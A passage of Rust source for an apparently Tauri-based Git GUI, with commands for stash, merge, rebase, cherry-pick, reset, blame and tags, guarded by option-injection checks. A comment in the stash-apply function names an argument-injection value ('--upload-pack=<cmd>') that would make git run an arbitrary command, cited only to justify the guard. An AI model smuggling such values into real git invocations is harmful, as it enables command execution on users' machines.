    const ALLOWED: &[&str] = &[
        "osxkeychain",
        "manager",
        "manager-core",
        "store",
        "cache",
        "libsecret",
        "secretservice",
        "wincred",
    ];
    if !ALLOWED.contains(&helper) {
        return Err(crate::error_proto::coded(
            "credential_helper_rejected",
            helper,
        ));
    }
    let out = git_output_local(git_cmd().args(["config", "--global", "credential.helper", helper]))
        .map_err(|e| format!("git config failed: {e}"))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(helper.to_string())
}

/// 把补丁应用到 index（--cached）或工作区（不传 cached），可 reverse。
/// DiffViewer 的 hunk 级 Stage/Unstage/Rollback 共用。
#[tauri::command]
pub fn git_apply_patch(
    repo_path: Option<String>,
    patch: String,
    cached: Option<bool>,
    reverse: Option<bool>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    if patch.trim().is_empty() {
        return Err(crate::error_proto::coded("patch_empty", ""));
    }
    if patch.len() > 16 * 1024 * 1024 {
        return Err(crate::error_proto::coded("patch_too_large", "16MB"));
    }
    let tmp = write_temp_file("lazecode-hunk", patch.as_bytes())?;
    let mut base = vec!["apply".to_string(), "--whitespace=nowarn".to_string()];
    if cached.unwrap_or(false) {
        base.push("--cached".to_string());
    }
    if reverse.unwrap_or(false) {
        base.push("--reverse".to_string());
    }
    let run = |extra: &[&str]| -> Result<std::process::Output, String> {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(&dir).args(&base);
        for e in extra {
            cmd.arg(e);
        }
        cmd.arg(tmp.path());
        git_output_local(&mut cmd).map_err(|e| format!("git apply failed: {e}"))
    };
    let check = run(&["--check"])?;
    if !check.status.success() {
        return Err(String::from_utf8_lossy(&check.stderr).trim().to_string());
    }
    let out = run(&[])?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&out.stdout).to_string())
}

/// 创建标签；message 非空时为附注标签（-a -m），否则为轻量标签；commit 为空时打在 HEAD
#[tauri::command]
pub fn git_create_tag(
    repo_path: Option<String>,
    name: String,
    commit: Option<String>,
    message: Option<String>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let name = name.trim();
    reject_option_like(name)?;
    let msg = message.as_deref().map(str::trim).filter(|m| !m.is_empty());
    let commit = commit.as_deref().map(str::trim).filter(|c| !c.is_empty());

    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).arg("tag");
    // 选项（-a/-m）排在 --end-of-options 之前，名字与提交才是位置参数
    if let Some(m) = msg {
        cmd.args(["-a", "-m", m]);
    }
    cmd.arg("--end-of-options").arg(name);
    if let Some(c) = commit {
        reject_option_like(c)?;
        cmd.arg(c);
    }

    let output = git_output_local(&mut cmd).map_err(|e| format!("git tag failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(format!("已创建标签 {}", name))
}

/// 摘取一个提交到当前分支；冲突时返回 stderr 供界面展示
#[tauri::command]
pub fn git_cherry_pick(repo_path: Option<String>, hash: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&hash)?;
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args([
        "cherry-pick",
        "--end-of-options",
        hash.trim(),
    ]))
    .map_err(|e| format!("cherry-pick failed: {}", e))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// sequencer 状态：MERGE_HEAD / CHERRY_PICK_HEAD / rebase-merge|rebase-apply 是否存在。
///
/// UI 据此决定冲突横幅与对话框上亮 [Abort Merge] 还是 [Continue/Abort Cherry-Pick]，
/// 而不是让用户猜 —— 旧提示直接叫人"去终端解决"，即本次补齐的缺口。
/// git dir 经 rev-parse 拿：worktree 下它是主仓 .git/worktrees/<id>（绝对路径），
/// 直接拼 `.git` 会错；Path::join 对绝对后段是替换语义，两种形态都对。
#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct SequencerStateDto {
    pub merging: bool,
    pub cherry_picking: bool,
    pub rebasing: bool,
    /// MERGE_HEAD 首行短 hash（octopus 取第一个）：Conflicts 对话框副标题与
    /// Theirs 列头用（"Conflicts during merging X into <branch>"）。
    pub merge_head: Option<String>,
    /// CHERRY_PICK_HEAD 短 hash：副标题 "cherry-picking commit <h> made by <author>"。
    pub cherry_pick_head: Option<String>,
    /// 被捡提交的作者与主题（一句），副标题用；取不到为 None。
    pub cherry_pick_author: Option<String>,
    pub cherry_pick_subject: Option<String>,
}

/// 读 sequencer 头文件首行（MERGE_HEAD/CHERRY_PICK_HEAD），转 7 位短 hash。
fn read_sequencer_head(git_dir: &Path, name: &str) -> Option<String> {
    let text = fs::read_to_string(git_dir.join(name)).ok()?;
    let full = text.lines().next()?.trim();
    if full.len() < 7 || !full.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    Some(full[..7].to_string())
}

#[tauri::command]
pub fn git_sequencer_state(repo_path: Option<String>) -> Result<SequencerStateDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let out = git_output(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["rev-parse", "--git-dir"]),
    )
    .map_err(|e| format!("git rev-parse failed: {}", e))?;
    if !out.status.success() {
        return Err(String::from_utf8_lossy(&out.stderr).trim().to_string());
    }
    let git_dir_raw = String::from_utf8_lossy(&out.stdout).trim().to_string();
    let git_dir = Path::new(&dir).join(git_dir_raw);
    let merging = git_dir.join("MERGE_HEAD").exists();
    let cherry_picking = git_dir.join("CHERRY_PICK_HEAD").exists();
    let rebasing = git_dir.join("rebase-merge").exists() || git_dir.join("rebase-apply").exists();
    let merge_head = if merging {
        read_sequencer_head(&git_dir, "MERGE_HEAD")
    } else {
        None
    };
    let cherry_pick_head = if cherry_picking {
        read_sequencer_head(&git_dir, "CHERRY_PICK_HEAD")
    } else {
        None
    };
    // 被捡提交的作者/主题：副标题 "made by …" 用。失败不致命（None 即可）。
    let (cherry_pick_author, cherry_pick_subject) = match &cherry_pick_head {
        Some(h) => {
            let out = git_output(git_cmd().arg("-C").arg(&dir).args([
                "log",
                "-1",
                "--format=%an%x00%s",
                h,
            ]))
            .ok()
            .filter(|o| o.status.success())
            .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
            .unwrap_or_default();
            let mut parts = out.trim_end().splitn(2, '\0');
            let author = parts.next().filter(|s| !s.is_empty()).map(str::to_string);
            let subject = parts.next().filter(|s| !s.is_empty()).map(str::to_string);
            (author, subject)
        }
        None => (None, None),
    };
    Ok(SequencerStateDto {
        merging,
        cherry_picking,
        rebasing,
        merge_head,
        cherry_pick_head,
        cherry_pick_author,
        cherry_pick_subject,
    })
}

/// 取消合并（git merge --abort）：回到合并前状态。
/// 前端只在 merging 时亮按钮；无合并在途时 git 原文拒绝（兜底，不另行包装）。
#[tauri::command]
pub fn git_merge_abort(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args(["merge", "--abort"]))
        .map_err(|e| format!("merge --abort failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 合并冲突解决（已暂存）后继续：git merge --continue。
/// 与 cherry-pick continue 同口径锁死 GIT_EDITOR，避免 commit.template 弹编辑器卡死。
#[tauri::command]
pub fn git_merge_continue(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).args(["merge", "--continue"]);
    cmd.env("GIT_EDITOR", "true");
    let output =
        git_output_local(&mut cmd).map_err(|e| format!("merge --continue failed: {}", e))?;
    if !output.status.success() {
        return Err(format!(
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        )
        .trim()
        .to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 变基冲突解决（已暂存）后继续；GIT_EDITOR=true 同上。
#[tauri::command]
pub fn git_rebase_continue(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).args(["rebase", "--continue"]);
    cmd.env("GIT_EDITOR", "true");
    let output =
        git_output_local(&mut cmd).map_err(|e| format!("rebase --continue failed: {}", e))?;
    if !output.status.success() {
        return Err(format!(
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        )
        .trim()
        .to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 放弃变基：回到 rebase 前状态（丢弃已解决的冲突内容，不可逆）。
#[tauri::command]
pub fn git_rebase_abort(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args(["rebase", "--abort"]))
        .map_err(|e| format!("rebase --abort failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 跳过当前变基提交（保留后续提交继续重放）。
#[tauri::command]
pub fn git_rebase_skip(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).args(["rebase", "--skip"]);
    cmd.env("GIT_EDITOR", "true");
    let output = git_output_local(&mut cmd).map_err(|e| format!("rebase --skip failed: {}", e))?;
    if !output.status.success() {
        return Err(format!(
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        )
        .trim()
        .to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// cherry-pick 冲突解决（已暂存）后继续。
/// GIT_EDITOR=true：沿用被捡提交的信息时 git 仍可能弹编辑器（配了 commit.template
/// 的机器必弹），IDE 里无终端可弹，直接卡死，必须锁死（与 rebase 同一处理）。
#[tauri::command]
pub fn git_cherry_pick_continue(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).args(["cherry-pick", "--continue"]);
    cmd.env("GIT_EDITOR", "true");
    let output =
        git_output_local(&mut cmd).map_err(|e| format!("cherry-pick --continue failed: {}", e))?;
    if !output.status.success() {
        return Err(format!(
            "{}{}",
            String::from_utf8_lossy(&output.stdout),
            String::from_utf8_lossy(&output.stderr)
        )
        .trim()
        .to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 放弃 cherry-pick（git cherry-pick --abort）：回到捡选前，HEAD 不动。
#[tauri::command]
pub fn git_cherry_pick_abort(repo_path: Option<String>) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output_local(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["cherry-pick", "--abort"]),
    )
    .map_err(|e| format!("cherry-pick --abort failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).trim().to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 把当前分支重置到指定提交：soft（保留暂存）/ mixed（保留工作区）/ hard（丢弃）/ keep
#[tauri::command]
pub fn git_reset(
    repo_path: Option<String>,
    commit: String,
    mode: Option<String>,
) -> Result<String, String> {
    let m = mode.unwrap_or_else(|| "mixed".to_string());
    if !matches!(m.as_str(), "soft" | "mixed" | "hard" | "keep" | "merge") {
        return Err(crate::error_proto::coded("reset_mode_unsupported", m));
    }
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&commit)?;
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args([
        "reset",
        &format!("--{}", m),
        "--end-of-options",
        commit.trim(),
    ]))
    .map_err(|e| format!("reset failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

// ---------------------------------------------------------------------------
// 文件历史 & Blame
// ---------------------------------------------------------------------------

/// Unix 时间戳（秒）→ "YYYY-MM-DD"；不引入 chrono，用 civil-from-days 算法
fn format_unix_date(ts: i64) -> String {
    let days = ts.div_euclid(86400);
    let z = days + 719468;
    let era = z.div_euclid(146097);
    let doe = z.rem_euclid(146097);
    let yoe = (doe - doe / 1460 + doe / 36524 - doe / 146096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    let y = if m <= 2 { y + 1 } else { y };
    format!("{:04}-{:02}-{:02}", y, m, d)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct BlameLineDto {
    /// 工作区文件中的行号（1 起）
    pub line: u32,
    pub hash: String,
    pub short_hash: String,
    pub author: String,
    pub date: String,
}

/// 行级 blame（对齐 PyCharm Annotate）。未提交行 author 为 "Not Committed Yet"。
#[tauri::command]
pub async fn git_blame(
    repo_path: Option<String>,
    path: String,
) -> Result<Vec<BlameLineDto>, String> {
    // blame 按文件行数线性耗时，大文件轻松上百毫秒，且每次打开文件（开关
    // 打开时）都会触发。同步执行会把 ipc worker 占住，期间用户其它操作
    // 全部排队。见 git_status 的说明。
    tauri::async_runtime::spawn_blocking(move || git_blame_impl(repo_path, path))
        .await
        .map_err(|e| format!("git_blame 任务失败: {e}"))?
}

/// git_blame 的同步实现，抽出理由同 git_status_impl。
fn git_blame_impl(repo_path: Option<String>, path: String) -> Result<Vec<BlameLineDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "blame",
        "--porcelain",
        "--",
        &path,
    ]))
    .map_err(|e| format!("git blame failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }

    let stdout = String::from_utf8_lossy(&output.stdout);

    // 单遍流式解析。原实现先把整份 porcelain 输出 collect 成 Vec<&str>
    // （大文件下是几百 KB 的指针数组），再对每个未缓存提交从当前位置向后
    // 重扫元数据块。改为边走边结算：遇到头行起一个 pending，元数据行补进
    // 它，遇到内容行（\t 开头）就把 pending 结算成一行 blame。
    //
    // git 对同一提交只在首次出现时给完整元数据，之后只重复哈希头，
    // 所以用 cache 命中即结算、无需再看后续元数据行。
    let mut cache: HashMap<String, (String, String)> = HashMap::new();
    let mut results: Vec<BlameLineDto> = Vec::new();

    // 待结算的提交：hash、最终行号、作者、时间戳（元数据还没到齐就为空串/0）
    let mut pending: Option<PendingBlame> = None;

    for ln in stdout.lines() {
        // 内容行（\t 开头）优先：结算上一条头。必须排在元数据分支之前，
        // 否则 pending 存在时内容行会被元数据分支吞掉，该行 blame 就丢了。
        if ln.starts_with('\t') {
            if let Some(p) = pending.take() {
                let hash = p.hash.clone();
                let dto = p.finish();
                // 同一提交后续只重复哈希头，缓存好下次直接结算
                cache.insert(hash, (dto.author.clone(), dto.date.clone()));
                results.push(dto);
            }
            continue;
        }

        // 元数据行：补进 pending（只有缓存未命中时才有 pending）
        if let Some(p) = pending.as_mut() {
            if let Some(v) = ln.strip_prefix("author ") {
                p.author = v.to_string();
            } else if let Some(v) = ln.strip_prefix("author-time ") {
                p.ts = v.trim().parse().unwrap_or(0);
            }
            continue;
        }

        // 头行：`<40位hash> <orig_line> <final_line> [<group_size>]`
        let mut toks = ln.split_whitespace();
        let (Some(h), Some(_orig), Some(fin)) = (toks.next(), toks.next(), toks.next()) else {
            continue;
        };
        if h.len() != 40 || fin.parse::<u32>().is_err() {
            continue;
        }
        let final_line: u32 = fin.parse().unwrap_or(0);

        if let Some((author, date)) = cache.get(h) {
            // 命中缓存：后续元数据行整块跳过，直接带着完整信息结算
            results.push(BlameLineDto {
                line: final_line,
                short_hash: h.chars().take(7).collect(),
                hash: h.to_string(),
                author: author.clone(),
                date: date.clone(),
            });
            continue;
        }

        pending = Some(PendingBlame {
            hash: h.to_string(),
            final_line,
            author: String::new(),
            ts: 0,
        });
        continue;
    }

    // 收尾：把最后一条 pending 结算掉（正常输出以内容行结尾，防御性处理）
    if let Some(p) = pending.take() {
        results.push(p.finish());
    }

    results.sort_by_key(|r| r.line);
    Ok(results)
}

/// git_blame 单遍解析的中间态：一条头 + 其后的元数据，遇到内容行时结算。
struct PendingBlame {
    hash: String,
    final_line: u32,
    author: String,
    ts: i64,
}

impl PendingBlame {
    fn finish(self) -> BlameLineDto {
        BlameLineDto {
            line: self.final_line,
            short_hash: self.hash.chars().take(7).collect(),
            hash: self.hash,
            author: self.author,
            date: format_unix_date(self.ts),
        }
    }
}

/// 单文件的提交历史（--follow 跟踪重命名），按时间倒序
#[tauri::command]
pub fn git_file_history(
    repo_path: Option<String>,
    path: String,
    max_count: Option<u32>,
) -> Result<Vec<GitCommitDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let limit = max_count.unwrap_or(200).to_string();

    let output = git_output(git_cmd().arg("-C").arg(&dir).args([
        "-c",
        "core.quotepath=false",
        "log",
        "--follow",
        "-n",
        &limit,
        "--pretty=format:%H%x09%h%x09%an%x09%ae%x09%ct%x09%s%x09%D%x09%P",
        "--",
        &path,
    ]))
    .map_err(|e| format!("git log failed: {}", e))?;
    if !output.status.success() {
        log::warn!(
            "git log --follow 失败: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
        return Ok(Vec::new());
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    Ok(raw_log_to_dto_seeded(parse_git_log_output(&stdout), &[], 0))
}

/// 某个提交版本与当前工作区中该文件的差异（历史面板「与工作区比较」）
#[tauri::command]
pub fn git_diff_ref_worktree(
    repo_path: Option<String>,
    ref_name: String,
    path: String,
) -> Result<FileDiffDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&ref_name)?;
    // `--end-of-options` 落在 ref 之前、`--` 仍留在 path 之前
    let text = run_git_diff(
        &dir,
        &[
            "diff",
            "--no-color",
            "--no-ext-diff",
            "--end-of-options",
            ref_name.trim(),
            "--",
            &path,
        ],
    )?;
    let (mut lines, mut additions, mut deletions) = parse_unified_diff(&text);
    let mut flags = patch_header_flags(&lines);
    let mut is_new = false;
    // 未跟踪文件不参与 `git diff <ref>`：与空文件比较，给出「全新增」差异
    if lines.is_empty() && is_new_file_vs_head(&dir, &path) {
        if let Some((l, a, d, bin)) = diff_against_empty_file(&dir, &path) {
            lines = l;
            additions = a;
            deletions = d;
            flags.is_binary = bin;
            flags.is_deleted = false;
            is_new = true;
        }
    }
    let (lines, truncated) = cap_diff_lines(lines);
    Ok(FileDiffDto {
        path,
        old_path: None,
        is_new,
        is_deleted: flags.is_deleted,
        is_binary: flags.is_binary,
        additions,
        deletions,
        lines,
        truncated,
    })
}

// ---------------------------------------------------------------------------
// Stash（贮藏）
// ---------------------------------------------------------------------------

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct GitStashDto {
    /// stash@{N} 中的 N
    pub index: u32,
    /// 完整引用名，如 "stash@{0}"
    pub selector: String,
    pub hash: String,
    pub short_hash: String,
    /// 贮藏说明：自定义消息或默认 "WIP on ..."
    pub message: String,
    /// 创建时的分支名（从消息解析，解析不出为空）
    pub branch: String,
    pub date: String,
}

/// 列出所有贮藏（stash@{0} 最新）
#[tauri::command]
pub fn git_stash_list(repo_path: Option<String>) -> Result<Vec<GitStashDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output(git_cmd().arg("-C").arg(&dir).args([
        "stash",
        "list",
        "--pretty=format:%gd%x09%H%x09%h%x09%ct%x09%s",
    ]))
    .map_err(|e| format!("git stash list failed: {}", e))?;
    if !output.status.success() {
        log::warn!(
            "git stash list 失败: {}",
            String::from_utf8_lossy(&output.stderr).trim()
        );
        return Ok(Vec::new());
    }

    let stdout = String::from_utf8_lossy(&output.stdout);
    let mut stashes = Vec::new();
    for line in stdout.lines() {
        let parts: Vec<&str> = line.split('\t').collect();
        if parts.len() < 5 {
            continue;
        }
        let selector = parts[0].trim();
        let index = selector
            .trim_start_matches("stash@{")
            .trim_end_matches('}')
            .parse()
            .unwrap_or(0);
        let message = parts[4].trim().to_string();
        // "On <branch>: <msg>" 或 "WIP on <branch>: <sha> <msg>"
        let branch = message
            .strip_prefix("On ")
            .or_else(|| message.strip_prefix("WIP on "))
            .and_then(|rest| rest.split(": ").next())
            .unwrap_or("")
            .to_string();

        stashes.push(GitStashDto {
            index,
            selector: selector.to_string(),
            hash: parts[1].trim().to_string(),
            short_hash: parts[2].trim().to_string(),
            message,
            branch,
            // `%ct` 是 unix 秒，直接下发会让前端显示 1759… 裸时间戳。
            // 与 git_list_shelves 的 mtime 同一处理：格式化成 YYYY-MM-DD，
            // 前端 UnstashDialog / ShelveDialog / CommitDrawer 原样渲染。
            date: format_unix_date(parts[3].trim().parse().unwrap_or(0)),
        });
    }
    Ok(stashes)
}

/// 创建贮藏：git stash push [-m msg] [-u]；无改动时返回 "No local changes" 提示
#[tauri::command]
pub fn git_stash_push(
    repo_path: Option<String>,
    message: Option<String>,
    include_untracked: Option<bool>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).arg("stash").arg("push");
    if let Some(m) = message.as_deref().filter(|m| !m.trim().is_empty()) {
        cmd.args(["-m", m.trim()]);
    }
    if include_untracked.unwrap_or(false) {
        cmd.arg("-u");
    }

    let output = git_output_local(&mut cmd).map_err(|e| format!("stash push failed: {}", e))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// 某个贮藏的改动文件清单（含未跟踪文件；旧版 git 不支持 -u 时自动降级）
#[tauri::command]
pub async fn git_stash_files(
    repo_path: Option<String>,
    stash: String,
) -> Result<Vec<CommitFileDto>, String> {
    // 两个 `git stash show` 变体（-u 与不带 -u）之间无依赖，并发发起让
    // 冷启动重叠；命令整体丢 blocking 池，不占 ipc worker。
    tauri::async_runtime::spawn_blocking(move || git_stash_files_impl(repo_path, stash))
        .await
        .map_err(|e| format!("git_stash_files 任务失败: {e}"))?
}

fn git_stash_files_impl(
    repo_path: Option<String>,
    stash: String,
) -> Result<Vec<CommitFileDto>, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let trimmed = stash.trim().to_string();
    // 同 apply/drop：selector 是位置参数，拒绝选项注入
    reject_option_like(&trimmed)?;

    let name_status = |extra: &[&str]| -> Result<std::process::Output, String> {
        git_output(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .args(["-c", "core.quotepath=false", "stash", "show"])
                .args(extra)
                .arg("--end-of-options")
                .arg(&trimmed),
        )
        .map_err(|e| format!("git stash show failed: {}", e))
    };

    // 优先带 -u（包含未跟踪文件），失败则去掉重试
    let ns = name_status(&["-u", "--name-status"])?;
    let num = name_status(&["-u", "--numstat"])?;
    let (ns, num) = if ns.status.success() && num.status.success() {
        (ns, num)
    } else {
        (
            name_status(&["--name-status"])?,
            name_status(&["--numstat"])?,
        )
    };
    if !ns.status.success() {
        return Err(String::from_utf8_lossy(&ns.stderr).to_string());
    }

    let mut files: Vec<CommitFileDto> = Vec::new();
    if num.status.success() {
        for line in String::from_utf8_lossy(&num.stdout).lines() {
            let parts: Vec<&str> = line.split('\t').collect();
            if parts.len() < 3 {
                continue;
            }
            files.push(CommitFileDto {
                path: decode_git_path(parts[2]),
                status: "M".to_string(),
                additions: parts[0].trim().parse().unwrap_or(0),
                deletions: parts[1].trim().parse().unwrap_or(0),
            });
        }
    }

    // 用 name-status 修正状态字母
    for line in String::from_utf8_lossy(&ns.stdout).lines() {
        if let Some((status, path)) = line.split_once('\t') {
            let path = decode_git_path(path);
            let status = status.trim().chars().next().unwrap_or('M').to_string();
            if let Some(f) = files.iter_mut().find(|f| f.path == path) {
                f.status = status;
            }
        }
    }

    Ok(files)
}

/// 恢复贮藏：pop = apply + 删除；冲突时返回 stderr
#[tauri::command]
pub fn git_stash_apply(
    repo_path: Option<String>,
    stash: String,
    pop: Option<bool>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    // selector 是 `git stash apply/drop` 的位置参数：以 `-` 开头会被 git
    // 当选项解析（`--upload-pack=<cmd>` = 任意命令执行）。正常值恒为
    // `stash@{N}`，入口拒绝即可，与全文件其余 21 处位置参数同款。
    reject_option_like(&stash)?;
    let mut cmd = git_cmd();
    cmd.arg("-C").arg(&dir).arg("stash");
    if pop.unwrap_or(false) {
        cmd.arg("pop");
    } else {
        cmd.arg("apply");
    }
    cmd.arg("--end-of-options").arg(stash.trim());

    let output = git_output_local(&mut cmd).map_err(|e| format!("stash apply failed: {}", e))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// 删除贮藏
#[tauri::command]
pub fn git_stash_drop(repo_path: Option<String>, stash: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    // 同 git_stash_apply：selector 必须是 `stash@{N}`，拒绝选项注入
    reject_option_like(&stash)?;
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args([
        "stash",
        "drop",
        "--end-of-options",
        stash.trim(),
    ]))
    .map_err(|e| format!("stash drop failed: {}", e))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct CompareResultDto {
    /// ref 上有而当前 HEAD 没有的提交
    pub commits: Vec<GitCommitDto>,
    /// 当前 HEAD 与 ref 的三点差异文件（merge-base → ref）
    pub files: Vec<CommitFileDto>,
}

// ---------------------------------------------------------------------------
// 右键菜单动作：Merge / Rebase / Amend Message / Drop Commit / Patch / Get from Revision
// ---------------------------------------------------------------------------

/// 合并 ref 到当前分支（对齐 PyCharm 分支右键 Merge 'x' into Current）；冲突返回 stderr
#[tauri::command]
pub fn git_merge(repo_path: Option<String>, ref_name: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&ref_name)?;
    let output = git_output_local(git_cmd().arg("-C").arg(&dir).args([
        "merge",
        "--no-edit",
        "--end-of-options",
        ref_name.trim(),
    ]))
    .map_err(|e| format!("merge failed: {}", e))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// 把当前分支变基到 ref 之上（对齐 Rebase Current onto 'x'）；冲突返回 stderr
#[tauri::command]
pub fn git_rebase(repo_path: Option<String>, ref_name: String) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&ref_name)?;
    let output = git_output_local(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .arg("rebase")
            .arg("--end-of-options")
            .arg(ref_name.trim()),
    )
    .map_err(|e| format!("rebase failed: {}", e))?;
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    if !output.status.success() {
        return Err(text);
    }
    Ok(text)
}

/// 修改 HEAD 提交的提交信息（git commit --amend -m）
///
/// 必须带 `--only`：不带时 amend 会把当前暂存区里的**任何**未提交内容
/// 一并并入该提交。用户在暂存区有无关改动时点「Edit Commit Message」，
/// 期望只改文字，结果把无关变更静默塞进历史。
/// `--only` 让 git 只重做提交对象本身，不动暂存区与工作区。
#[tauri::command]
pub fn git_amend_message(repo_path: Option<String>, message: String) -> Result<String, String> {
    let msg = message.trim();
    if msg.is_empty() {
        return Err(crate::error_proto::coded("commit_message_empty", ""));
    }
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let output = git_output_local(
        git_cmd()
            .arg("-C")
            .arg(&dir)
            .args(["commit", "--amend", "--only", "-m", msg]),
    )
    .map_err(|e| format!("amend failed: {}", e))?;
    if !output.status.success() {
        return Err(String::from_utf8_lossy(&output.stderr).to_string());
    }
    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 删除提交：HEAD 提交用 reset --hard HEAD~1；其余用 rebase --onto 摘除（合并提交不可删）
#[tauri::command]
pub fn git_drop_commit(
    repo_path: Option<String>,
    hash: String,
    // HEAD 走 reset --hard、非 HEAD 走 rebase --onto，两者都要求工作区没有
    // 未提交改动；只有前端明确二次确认后才允许 force。
    force: Option<bool>,
) -> Result<String, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let hash = hash.trim();
    reject_option_like(hash)?;
    if !force.unwrap_or(false) {
        let status = git_output(git_cmd().arg("-C").arg(&dir).args([
            "-c",
            "core.quotepath=false",
            "status",
            "--porcelain",
            "--untracked-files=no",
        ]))
        .map_err(|e| format!("git status failed: {e}"))?;
        if !status.status.success() {
